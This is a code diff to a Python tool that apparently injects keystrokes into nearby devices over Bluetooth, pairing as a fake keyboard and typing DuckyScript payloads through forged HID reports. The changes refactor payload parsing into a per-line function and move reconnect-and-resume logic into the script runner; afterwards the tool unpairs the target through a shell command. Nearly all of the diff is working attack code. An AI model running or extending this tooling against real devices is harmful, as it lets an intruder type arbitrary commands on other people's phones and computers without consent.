@@ -135,8 +135,9 @@ class PairingAgent:
             raise
 
 class L2CAPConnectionManager:
-    def __init__(self, target_address):
+    def __init__(self, target_address, adapter_id):
         self.target_address = target_address
+        self.adapter_id = adapter_id
         self.clients = {}
 
     def create_connection(self, port):
@@ -258,7 +259,6 @@ class L2CAPClient:
             self.connected = True
             log.debug("SUCCESS! connected on port %d" % self.port)
         except Exception as ex:
-            error = True
             self.connected = False
             log.error("ERROR connecting on port %d: %s" % (self.port, ex))
             raise ConnectionFailureException(f"Connection failure on port {self.port}")
@@ -293,141 +293,161 @@ class L2CAPClient:
         self.send(release_report)
         time.sleep(delay)
 
-def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
-    client.send_keypress('')  # Send empty report to ensure a clean start
-    time.sleep(0.5)
-
+def __process_duckyscript_line(client, line, current_position = 0):
     shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
+    line = line.strip()
+    log.info(f"Processing {line}")
     try:
-        for line_number, line in enumerate(duckyscript):
-            if line_number < current_line:
-                continue  # Skip already processed lines
+        if not line or line.startswith("REM"):
+            return None
+        if line.startswith("TAB"):
+            client.send_keypress(Key_Codes.TAB)
+        if line.startswith("PRIVATE_BROWSER"):
+            report = bytes([0xa1, 0x01, Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 0x00, Key_Codes.n.value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+            client.send(report)
+            # Don't forget to send a release report afterwards
+            release_report = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+            client.send(release_report)
+        if line.startswith("VOLUME_UP"):
+            # Send GUI + V
+            hid_report_gui_v = bytes.fromhex("a1010800190000000000")
+            client.send(hid_report_gui_v)
+            time.sleep(0.1)  # Short delay
 
-            if line_number == current_line and current_position > 0:
-                line = line[current_position:]  # Resume from the last position within the current line
-            else:
-                current_position = 0  # Reset position for new line
+            client.send_keypress(Key_Codes.TAB)
 
-            line = line.strip()
-            log.info(f"Processing {line}")
-            if not line or line.startswith("REM"):
-                continue
-            if line.startswith("TAB"):
-                client.send_keypress(Key_Codes.TAB)
-            if line.startswith("PRIVATE_BROWSER"):
-                report = bytes([0xa1, 0x01, Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 0x00, Key_Codes.n.value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
-                client.send(report)
-                # Don't forget to send a release report afterwards
-                release_report = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
-                client.send(release_report)
-            if line.startswith("VOLUME_UP"):
-                # Send GUI + V
-                hid_report_gui_v = bytes.fromhex("a1010800190000000000")
-                client.send(hid_report_gui_v)
-                time.sleep(0.1)  # Short delay
+            # Press UP while holding GUI + V
+            hid_report_up = bytes.fromhex("a1010800195700000000")
+            client.send(hid_report_up)
+            time.sleep(0.1)  # Short delayF
 
-                client.send_keypress(Key_Codes.TAB)
-
-                # Press UP while holding GUI + V
-                hid_report_up = bytes.fromhex("a1010800195700000000")
-                client.send(hid_report_up)
-                time.sleep(0.1)  # Short delayF
-
-                # Release all keys
-                hid_report_release = bytes.fromhex("a1010000000000000000")
-                client.send(hid_report_release)
-            if line.startswith("DELAY"):
+            # Release all keys
+            hid_report_release = bytes.fromhex("a1010000000000000000")
+            client.send(hid_report_release)
+        if line.startswith("DELAY"):
+            try:
+                # Extract delay time from the line
+                delay_time = int(line.split()[1])  # Assumes delay time is in milliseconds
+                time.sleep(delay_time / 1000)  # Convert milliseconds to seconds for sleep
+            except ValueError:
+                log.error(f"Invalid DELAY format in line: {line}")
+            except IndexError:
+                log.error(f"DELAY command requires a time parameter in line: {line}")
+            return  # Move to the next line after the delay
+        if line.startswith("STRING"):
+            text = line[7:]
+            for current_position, char in enumerate(text, start=1):
+                log.notice(f"Attempting to send letter: {char}")
+                # Process each character
                 try:
-                    # Extract delay time from the line
-                    delay_time = int(line.split()[1])  # Assumes delay time is in milliseconds
-                    time.sleep(delay_time / 1000)  # Convert milliseconds to seconds for sleep
-                except ValueError:
-                    log.error(f"Invalid DELAY format in line: {line}")
-                except IndexError:
-                    log.error(f"DELAY command requires a time parameter in line: {line}")
-                continue  # Move to the next line after the delay
-            if line.startswith("STRING"):
-                text = line[7:]
-                for char_position, char in enumerate(text, start=1):
-                    log.notice(f"Attempting to send letter: {char}")
-                    # Process each character
-                    try:
-                        if char.isdigit():
-                            key_code = getattr(Key_Codes, f"_{char}")
-                            client.send_keypress(key_code)
-                        elif char == " ":
-                            client.send_keypress(Key_Codes.SPACE)
-                        elif char == "[":
-                            client.send_keypress(Key_Codes.LEFTBRACE)
-                        elif char == "]":
-                            client.send_keypress(Key_Codes.RIGHTBRACE)
-                        elif char == ";":
-                            client.send_keypress(Key_Codes.SEMICOLON)
-                        elif char == "'":
-                            client.send_keypress(Key_Codes.QUOTE)
-                        elif char == "/":
-                            client.send_keypress(Key_Codes.SLASH)
-                        elif char == ".":
-                            client.send_keypress(Key_Codes.DOT)
-                        elif char == ",":
-                            client.send_keypress(Key_Codes.COMMA)
-                        elif char == "|":
-                            client.send_keypress(Key_Codes.PIPE)
-                        elif char == "-":
-                            client.send_keypress(Key_Codes.MINUS)
-                        elif char == "=":
-                            client.send_keypress(Key_Codes.EQUAL)
-                        elif char in shift_required_characters:
-                            key_code_str = char_to_key_code(char)
-                            if key_code_str:
-                                key_code = getattr(Key_Codes, key_code_str)
-                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
-                            else:
-                                log.warning(f"Unsupported character '{char}' in Duckyscript")
-                        elif char.isalpha():
-                            key_code = getattr(Key_Codes, char.lower())
-                            if char.isupper():
-                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
-                            else:
-                                client.send_keypress(key_code)
+                    if char.isdigit():
+                        key_code = getattr(Key_Codes, f"_{char}")
+                        client.send_keypress(key_code)
+                    elif char == " ":
+                        client.send_keypress(Key_Codes.SPACE)
+                    elif char == "[":
+                        client.send_keypress(Key_Codes.LEFTBRACE)
+                    elif char == "]":
+                        client.send_keypress(Key_Codes.RIGHTBRACE)
+                    elif char == ";":
+                        client.send_keypress(Key_Codes.SEMICOLON)
+                    elif char == "'":
+                        client.send_keypress(Key_Codes.QUOTE)
+                    elif char == "/":
+                        client.send_keypress(Key_Codes.SLASH)
+                    elif char == ".":
+                        client.send_keypress(Key_Codes.DOT)
+                    elif char == ",":
+                        client.send_keypress(Key_Codes.COMMA)
+                    elif char == "|":
+                        client.send_keypress(Key_Codes.PIPE)
+                    elif char == "-":
+                        client.send_keypress(Key_Codes.MINUS)
+                    elif char == "=":
+                        client.send_keypress(Key_Codes.EQUAL)
+                    elif char in shift_required_characters:
+                        key_code_str = char_to_key_code(char)
+                        if key_code_str:
+                            key_code = getattr(Key_Codes, key_code_str)
+                            client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                         else:
-                            key_code = char_to_key_code(char)
-                            if key_code:
-                                client.send_keypress(key_code)
-                            else:
-                                log.warning(f"Unsupported character '{char}' in Duckyscript")
+                            log.warning(f"Unsupported character '{char}' in Duckyscript")
+                    elif char.isalpha():
+                        key_code = getattr(Key_Codes, char.lower())
+                        if char.isupper():
+                            client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
+                        else:
+                            client.send_keypress(key_code)
+                    else:
+                        key_code = char_to_key_code(char)
+                        if key_code:
+                            client.send_keypress(key_code)
+                        else:
+                            log.warning(f"Unsupported character '{char}' in Duckyscript")
 
-                        current_position = char_position
+                except AttributeError as e:
+                    log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")
 
-                    except AttributeError as e:
-                        log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")
+        elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
+            # Process modifier key combinations
+            components = line.split()
+            if len(components) == 2:
+                modifier, key = components
+                try:
+                    # Convert to appropriate enums
+                    modifier_enum = getattr(Modifier_Codes, modifier.upper())
+                    key_enum = getattr(Key_Codes, key.lower())
+                    client.send_keyboard_combination(modifier_enum, key_enum)
+                    log.notice(f"Sent combination: {line}")
+                except AttributeError:
+                    log.warning(f"Unsupported combination: {line}")
+            else:
+                log.warning(f"Invalid combination format: {line}")
+        elif line.startswith("ENTER"):
+            client.send_keypress(Key_Codes.ENTER)
+    except ReconnectionRequiredException as e:
+        return current_position
 
-            elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
-                # Process modifier key combinations
-                components = line.split()
-                if len(components) == 2:
-                    modifier, key = components
-                    try:
-                        # Convert to appropriate enums
-                        modifier_enum = getattr(Modifier_Codes, modifier.upper())
-                        key_enum = getattr(Key_Codes, key.lower())
-                        client.send_keyboard_combination(modifier_enum, key_enum)
-                        log.notice(f"Sent combination: {line}")
-                    except AttributeError:
-                        log.warning(f"Unsupported combination: {line}")
+    return None
+
+def process_duckyscript(connection_manager, duckyscript):
+    current_line = 0
+    current_position = 0
+    line_number = 0
+
+    while True:
+        client = setup_and_connect(connection_manager)
+        client.send_keypress('')  # Send empty report to ensure a clean start
+        time.sleep(0.5)
+
+        current_line += line_number # update current_line after a possible break in the following loop
+
+        for line_number, line in enumerate(duckyscript[current_line:]):
+
+            try:
+                current_position = __process_duckyscript_line(client, line, current_position = current_position)
+
+                if current_position is None:
+                    current_position = 0 # Successfully went through line. Reset current_position
                 else:
-                    log.warning(f"Invalid combination format: {line}")
-            elif line.startswith("ENTER"):
-                client.send_keypress(Key_Codes.ENTER)
-            # After processing each line, reset current_position to 0 and increment current_line
-            current_position = 0
-            current_line += 1
+                    # Reconnection Required
+                    log.info(f"{AnsiColorCode.RESET}Reconnection required. Attempting to reconnect{AnsiColorCode.BLUE}...")
+                    connection_manager.close_all()
+                    # Sleep before retrying to avoid rapid reconnection attempts
+                    time.sleep(2)
+                    break
 
-    except ReconnectionRequiredException:
-        raise ReconnectionRequiredException("Reconnection required", current_line, current_position)
-    except Exception as e:
-        log.error(f"Error during script execution: {e}")
+            except Exception as e:
+                log.error(f"Error during script execution: {e}")
+                # After processing each line, reset current_position to 0 and increment current_line
+                current_position = 0
+                current_line += 1
+                return
+
+        log.info("Execution successful")
+        time.sleep(2)
+        break
 
 def char_to_key_code(char):
     # Mapping for special characters that always require SHIFT
@@ -683,34 +703,16 @@ def main():
         log.info("Payload file not found. Exiting.")
         return
 
-    adapter = setup_bluetooth(target_address, adapter_id)
+    adapter = setup_bluetooth(target_address)
     adapter.enable_ssp()
 
-    current_line = 0
-    current_position = 0
-    connection_manager = L2CAPConnectionManager(target_address)
+    connection_manager = L2CAPConnectionManager(target_address, adapter_id)
 
-    while True:
-        try:
-            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
-            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
-            time.sleep(2)
-            break  # Exit loop if successful
+    process_duckyscript(connection_manager, duckyscript)
 
-        except ReconnectionRequiredException as e:
-            log.info(f"{AnsiColorCode.RESET}Reconnection required. Attempting to reconnect{AnsiColorCode.BLUE}...")
-            current_line = e.current_line
-            current_position = e.current_position
-            connection_manager.close_all()
-            # Sleep before retrying to avoid rapid reconnection attempts
-            time.sleep(2)
-
-        finally:
-            # unpair the target device
-
-            command = f'echo -e "remove {target_address}\n" | bluetoothctl'
-            subprocess.run(command, shell=True)
-            print(f"{AnsiColorCode.BLUE}Successfully Removed device{AnsiColorCode.RESET}: {AnsiColorCode.BLUE}{target_address}{AnsiColorCode.RESET}")
+    command = f'echo -e "remove {target_address}\n" | bluetoothctl'
+    subprocess.run(command, shell=True)
+    print(f"{AnsiColorCode.BLUE}Successfully Removed device{AnsiColorCode.RESET}: {AnsiColorCode.BLUE}{target_address}{AnsiColorCode.RESET}")
 
 if __name__ == "__main__":
     setup_logging()
